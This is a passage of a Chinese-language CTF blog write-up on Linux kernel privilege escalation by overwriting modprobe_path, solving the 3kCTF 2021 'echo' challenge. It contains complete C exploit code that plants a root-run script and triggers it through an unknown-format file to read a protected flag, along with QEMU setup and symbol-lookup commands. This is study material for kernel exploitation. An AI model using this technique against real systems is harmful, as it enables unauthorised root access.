+<p>通過 <code>cat /proc/sys/kernel/modprobe</code><br>可以查看當前 modprode_path 指向的東西<br>也就是說當有 kernel 任意寫去任意寫調 modprobe_path 時這裡會改變</p>
+<h2 id="modprobe-path-EoP"><a href="#modprobe-path-EoP" class="headerlink" title="modprobe path EoP"></a>modprobe path EoP</h2><p>準備兩個 file<br>一個 file 是無法被 kernel 識別的 file (&#x2F;tmp&#x2F;exec)<br>一個是 script，用來將 flag 寫到其他可讀的地方 (&#x2F;tmp&#x2F;p)</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">setup</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	system(<span class="string">&quot;echo -ne &#x27;#!/bin/sh\ncat /flag.txt &gt; /tmp/flag&#x27; &gt; /tmp/p&quot;</span>);</span><br><span class="line">	system(<span class="string">&quot;chmod a+x /tmp/p&quot;</span>);</span><br><span class="line">	system(<span class="string">&quot;echo -ne &#x27;\xff\xff\xff\xff&#x27; &gt; /tmp/exec&quot;</span>);</span><br><span class="line">	system(<span class="string">&quot;chmod a+x /tmp/exec&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我們先去修改 mod_probe 成 &#x2F;tmp&#x2F;p<br>再去執行 &#x2F;tmp&#x2F;exec 就可以執行我們讀 flag 的操作了</p>
+<h2 id="3kctf-2021-echo"><a href="#3kctf-2021-echo" class="headerlink" title="3kctf 2021 - echo"></a>3kctf 2021 - echo</h2><p><a target="_blank" rel="noopener" href="https://static.2021.ctf.the3000.org/challenges/pwn/echo-447e7d55a7bc1f96518a18b7d645320b.tgz">https://static.2021.ctf.the3000.org/challenges/pwn/echo-447e7d55a7bc1f96518a18b7d645320b.tgz</a><br>由於這次 exploit 目的在於復現出 modprobe 這個方法來 RCE<br>因此先把這題 kaslr 關掉</p>
+<p>一樣先做一些前置的準備</p>
+<h3 id="前置準備"><a href="#前置準備" class="headerlink" title="前置準備"></a>前置準備</h3><p>start.sh</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">exec</span> qemu-system-x86_64 \</span><br><span class="line">    -m 128M \</span><br><span class="line">    -nographic \</span><br><span class="line">    -kernel <span class="string">&quot;./bzImage&quot;</span> \</span><br><span class="line">    -append <span class="string">&quot;console=ttyS0 oops=panic panic=1 pti=on nokaslr&quot;</span> \</span><br><span class="line">    -no-reboot \</span><br><span class="line">    -cpu qemu64,+smep,+smap \</span><br><span class="line">    -monitor /dev/null \</span><br><span class="line">    -initrd <span class="string">&quot;./initramfs.cpio&quot;</span> \</span><br><span class="line">    -smp 2 \</span><br><span class="line">    -smp cores=2 \</span><br><span class="line">    -smp threads=1 \</span><br></pre></td></tr></table></figure>
+
+<p>然後解壓整包 file</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> -p sysfile</span><br><span class="line"><span class="built_in">mv</span> ./initramfs.cpio ./initramfs.cpio.gz</span><br><span class="line">gunzip initramfs.cpio.gz</span><br><span class="line">cpio -idmv -D sysfile &lt; initramfs.cpio</span><br></pre></td></tr></table></figure>
+
+<h3 id="analyze-source-code"><a href="#analyze-source-code" class="headerlink" title="analyze source code"></a>analyze source code</h3><p>非常短，他添加了一個 syscall，當你去 call 他時他會往你指定的位置寫入東西<br>就是一個任意寫</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/syscalls.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;asm/uaccess_64.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Syscall number : 548</span></span><br><span class="line"></span><br><span class="line">SYSCALL_DEFINE2(echo, <span class="type">void</span>*, to, <span class="type">void</span>*, from) &#123;</span><br><span class="line">    <span class="keyword">return</span> copy_user_generic_unrolled(to, from, <span class="number">8</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>這邊先來嘗試寫 modprobe_path<br>第一步要來找他的 address</p>
+<p>先把 init 改成 root ，來去印 symbol<br><code>setsid /bin/cttyhack setuidgid 0 /bin/sh</code></p>
+<p>通過這種方式可以直接找到 address (0xffffffff81837cc0)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/ # cat /proc/kallsyms | grep modprobe_path</span><br><span class="line">ffffffff81837cc0 D modprobe_path</span><br></pre></td></tr></table></figure>
+
+<p>並且可以看到 modprobe 現在指在 &#x2F;sbin&#x2F;modprobe</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/ # cat /proc/sys/kernel/modprobe</span><br><span class="line">/sbin/modprobe</span><br></pre></td></tr></table></figure>
+
+<p>執行完這份 exploit 後就會改指向 &#x2F;tmp&#x2F;a 了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/ # cat /proc/sys/kernel/modprobe </span><br><span class="line">/tmp/a</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">set_file</span><span class="params">()</span>&#123;</span><br><span class="line">	system(<span class="string">&quot;echo -ne &#x27;#!/bin/sh\ncat /flag.txt &gt; /tmp/flag&#x27; &gt; /tmp/a&quot;</span>);</span><br><span class="line">	system(<span class="string">&quot;echo -ne &#x27;\xff\xff\xff\xff&#x27; &gt; /tmp/unknown&quot;</span>);</span><br><span class="line">	system(<span class="string">&quot;chmod a+x /tmp/unknown&quot;</span>);</span><br><span class="line">	system(<span class="string">&quot;chmod a+x /tmp/a&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">	set_file();</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> modprobepath = <span class="number">0xffffffff81837cc0</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;0x:%lx\n&quot;</span>, modprobepath);</span><br><span class="line">	syscall(<span class="number">548</span>, modprobepath, <span class="string">&quot;/tmp/a&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>之後我們只要去執行 &#x2F;tmp&#x2F;unknown<br>就會觸發 modprobe_path 了，我們的 flag 就被寫入到一般使用者可以讀的檔案了</p>
+<h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">set_file</span><span class="params">()</span>&#123;</span><br><span class="line">	system(<span class="string">&quot;echo -ne &#x27;#!/bin/sh\ncat /flag.txt &gt; /tmp/flag&#x27; &gt; /tmp/a&quot;</span>);</span><br><span class="line">	system(<span class="string">&quot;echo -ne &#x27;\xff\xff\xff\xff&#x27; &gt; /tmp/unknown&quot;</span>);</span><br><span class="line">	system(<span class="string">&quot;chmod a+x /tmp/unknown&quot;</span>);</span><br><span class="line">	system(<span class="string">&quot;chmod a+x /tmp/a&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">print_flag</span><span class="params">()</span>&#123;</span><br><span class="line">	system(<span class="string">&quot;/tmp/unknown&quot;</span>);</span><br><span class="line">	system(<span class="string">&quot;cat /tmp/flag&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">	set_file();</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> modprobepath = <span class="number">0xffffffff81837cc0</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;0x:%lx\n&quot;</span>, modprobepath);</span><br><span class="line">	syscall(<span class="number">548</span>, modprobepath, <span class="string">&quot;/tmp/a&quot;</span>);</span><br><span class="line">	</span><br><span class="line">	print_flag();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<iframe width="560" height="315" src="https://www.youtube.com/embed/3MsPTeDFxCQ?si=fDUvH3edJN6FEUaH" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+      
+      
+      
+      
+      
+      
+      
+
+    </footer>
+  </div>
+  
+  <nav id="article-nav" data-aos="fade-up">
+    
+    
+    <div class="article-nav-link-wrap article-nav-link-right">
+      
+        <img data-src="/images/posts_cover/Windows-kernel-exploitation/Windows-kernel-exploitation.webp" data-sizes="auto" alt="Windows Kernel exploitation - Part 1" class="lazyload">
+      
+      <a href="/2025/04/02/Windows-Kernel-Exploitation-Part1/"></a>
+      <div class="article-nav-caption">Older</div>
+      <h3 class="article-nav-title">
+        
+          Windows Kernel exploitation - Part 1
+        
+      </h3>
+    </div>
+    
+  </nav>
+
+
+</article>
+
+
+
+
+
+
+</section>
+        </div>
+        
+        
+        <footer id="footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    
+    <div>
+      <span class="icon-copyright"></span>
+      2020-2025
+      <span class="footer-info-sep rotate"></span>
+      Naup堇姬
+    </div>
+    
+      <div>
+        Powered by&nbsp;<a href="https://hexo.io/" rel="noopener external nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener external nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+    
+    
+      <div>
+        <span class="icon-brush"></span>
+        163.4k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        14:19
+      </div>
+    
+    
+    
+    
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">Number of visits&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">Number of visitors&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+    
+  </div>
+</footer>
+
+        
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav">
+  <div class="sidebar-wrap">
+    
+      <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">Contents</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Linux-Kernel-EoP-by-modprobe-2021-3kCTF-echo-nerf"><span class="toc-number">1.</span> <span class="toc-text">Linux Kernel - EoP by modprobe &amp; 2021 3kCTF echo nerf</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AA%BF%E7%94%A8%E9%8F%88"><span class="toc-number">1.2.</span> <span class="toc-text">調用鏈</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#do-execve"><span class="toc-number">1.2.1.</span> <span class="toc-text">do_execve</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#do-execveat-common"><span class="toc-number">1.2.2.</span> <span class="toc-text">do_execveat_common</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#bprm-execve"><span class="toc-number">1.2.3.</span> <span class="toc-text">bprm_execve</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exec-binprm"><span class="toc-number">1.2.4.</span> <span class="toc-text">exec_binprm</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#search-binary-handler"><span class="toc-number">1.2.5.</span> <span class="toc-text">search_binary_handler</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#request-module"><span class="toc-number">1.2.6.</span> <span class="toc-text">request_module</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#call-modprobe"><span class="toc-number">1.2.7.</span> <span class="toc-text">call_modprobe</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#modprobe-path-EoP"><span class="toc-number">1.3.</span> <span class="toc-text">modprobe path EoP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3kctf-2021-echo"><span class="toc-number">1.4.</span> <span class="toc-text">3kctf 2021 - echo</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E6%BA%96%E5%82%99"><span class="toc-number">1.4.1.</span> <span class="toc-text">前置準備</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#analyze-source-code"><span class="toc-number">1.4.2.</span> <span class="toc-text">analyze source code</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exploit"><span class="toc-number">1.5.</span> <span class="toc-text">exploit</span></a></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+      <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="Naup堇姬" class="lazyload">
+  <div class="sidebar-author-name">Naup堇姬</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>Posts</div>
+    <div class="sidebar-state-number">64</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>Categories</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>Tags</div>
+    <div class="sidebar-state-number">21</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+    <div class="icon-email sidebar-social-icon">
+      <a href=naup96721@gmail.com itemprop="url" target="_blank" aria-label="email" rel="noopener external nofollow noreferrer"></a>
+    </div>
+  
+    <div class="icon-github sidebar-social-icon">
+      <a href=https://github.com/Naupjjin itemprop="url" target="_blank" aria-label="github" rel="noopener external nofollow noreferrer"></a>
+    </div>
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="Home"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">Home</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="Archives"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">Archives</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="About"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">About</div>
+      </div>
+    
+  
+</div>
+</div>
+    
+  </div>
+  
+    <div class="sidebar-btn-wrapper">
+      <div class="sidebar-toc-btn current"></div>
+      <div class="sidebar-common-btn"></div>
+    </div>
+  
+</nav>
+
+    </div>
+    
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+
+
+
+
+
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.0.6/dist/index.umd.js" integrity="sha384-vkGvf25gm1C1PbcoD5dNfc137HzNL&#x2F;hr1RKA5HniJOaawtvUmH5lTVFgFAruE9Ge" crossorigin="anonymous"></script>
+
+  <script>
+    window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["#ff5252","#ff7c7c","#ffafaf","#ffd0d0"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["#ff0000"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'))
+  </script>
+
+
+
+
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+    
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "Naup堇姬",
+          title: "Linux Kernel - EoP by modprobe &amp; 2021 3kCTF echo nerf",
+          url: "http://example.com/2025/04/04/Linux-Kernel-modprobe-EoP-and-2021-3kctf-echo-nerf/",
+          excerpt: "",
+          description: "",
+          stripContent: "Linux Kernel - EoP by modprobe &amp;amp; 2021 3kCTF echo nerf Author: 堇姬Naup  前言一個酷酷的 kernel pwn 萬解 www 調用鏈當你去執行一個檔案時會有以下調用鏈 do_execve第一步去 call do_execvehttps://elixir.bootlin.com/linux/v6.13.7/source/fs/exec.c#L2040 12345678static int do_execve(struct f",
+          date: "Fri Apr 04 2025 16:49:23 GMT+0800",
+          updated: "Fri Apr 04 2025 16:51:20 GMT+0800",
+          cover: "/images/posts_cover/LinuxKernelPwn/linuxkernel.png",
+        };
+      </script>
+       
+    
+    
+      
+        
+<script src="/js/insert_highlight.js" data-pjax></script>
+
+        
+      
+    
+    
+      <script type="module" data-pjax>
+        const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+        
+        const pswp = () => {
+          if (_$$('.article-entry a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-entry',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          if(_$$('.article-gallery a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-gallery',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          window.lightboxStatus = 'done';
+          window.removeEventListener('lightbox:ready', pswp);
+        }
+        if(window.lightboxStatus === 'ready') {
+          pswp()
+        } else {
+          window.addEventListener('lightbox:ready', pswp);
+        }
+      </script>
+      
+
+
+
+
+
+
+
+
+    
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.3.0' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+
+
+
+
+  </body>
+  </html>
+
